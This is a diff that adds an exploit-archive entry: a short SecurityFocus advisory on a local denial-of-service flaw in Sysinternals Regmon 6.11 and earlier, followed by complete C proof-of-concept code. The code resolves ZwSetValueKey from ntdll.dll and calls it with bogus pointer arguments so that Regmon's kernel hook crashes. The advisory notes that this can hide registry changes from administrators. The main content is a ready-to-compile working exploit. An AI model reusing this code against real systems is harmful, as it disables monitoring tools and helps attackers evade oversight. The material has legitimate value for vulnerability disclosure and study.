@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/11042/info
+
+Regmon is reported prone to a local denial of service vulnerability. This issue presents itself because the application fails to handle exceptional conditions and references unvalidated pointers to kernel functions.
+
+Successful exploitation may allow a local unauthorized attacker to cause a denial of service condition in the application. The attacker may then obfuscate changes to the registry from the administrator and carry out further attacks against a vulnerable computer.
+
+Regmon 6.11 for NT/9x and prior versions are reportedly affected by this issue. 
+
+/*
+ *  ntregmon-dos.c (up to 6.11)
+ *
+ *  Copyright (c) 2002-2004 By Next Generation Security S.L.
+ *  All rights reserved
+ *  http://www.ngsec.com
+ *
+ *  Compiles with: cl ntregmon-dos.c
+ *
+ *  Madrid, August 2004
+ */
+
+#include <windows.h>
+
+#define MY_NULL 0x01
+typedef DWORD (* zwsetvaluekey_TYPE)(DWORD KeyHandle, DWORD ValueName, DWORD TitleIndex, DWORD Type, DWORD Data, DWORD DataSize);
+
+
+int main(int argc, char *argv[]) {
+HINSTANCE dll;
+zwsetvaluekey_TYPE my_ZwSetValueKey;
+
+  if ((dll=LoadLibrary("ntdll.dll"))!=NULL) {
+
+     if ((my_ZwSetValueKey=(zwsetvaluekey_TYPE)GetProcAddress(dll,"ZwSetValueKey"))!=NULL) {
+
+         my_ZwSetValueKey(MY_NULL,MY_NULL,MY_NULL,MY_NULL,MY_NULL,MY_NULL);
+
+     }
+  }
+
+}
